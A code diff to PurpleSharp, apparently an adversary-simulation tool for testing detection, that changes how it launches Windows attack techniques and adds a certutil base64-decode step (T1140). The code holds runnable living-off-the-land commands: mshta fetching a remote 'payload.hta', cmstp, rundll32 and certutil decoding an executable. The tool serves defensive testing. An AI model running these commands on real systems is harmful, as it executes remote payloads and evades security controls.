@@ -20,7 +20,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
-                ExecutionHelper.StartProcess("", String.Format("cmstp.exe /s /ns {0}", file), logger);
+                ExecutionHelper.StartProcess("", String.Format("cmstp /s /ns {0}", file), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
@@ -37,10 +37,28 @@ namespace PurpleSharp.Simulations
             try
             {
                 string url = "http://webserver/payload.hta";
-                ExecutionHelper.StartProcess("", String.Format("mshta.exe {0}", url), logger);
+                ExecutionHelper.StartProcess("", String.Format("mshta {0}", url), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
+
+        public static void DeobfuscateDecode(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1140");
+            try
+            {
+                string encoded = "encodedb64.txt";
+                string decoded = "decoded.exe";
+                ExecutionHelper.StartProcess("", String.Format("certutil -decode {0} {1}", encoded, decoded), logger);
+                logger.SimulationFinished();
+            }
+            catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
@@ -71,7 +89,7 @@ namespace PurpleSharp.Simulations
             try
             {
                 string file = @"C:\Windows\twain_64.dll";
-                ExecutionHelper.StartProcess("", String.Format("rundll32.exe \"{0}\"", file), logger);
+                ExecutionHelper.StartProcess("", String.Format("rundll32 \"{0}\"", file), logger);
                 logger.SimulationFinished();
             }
             catch(Exception ex)
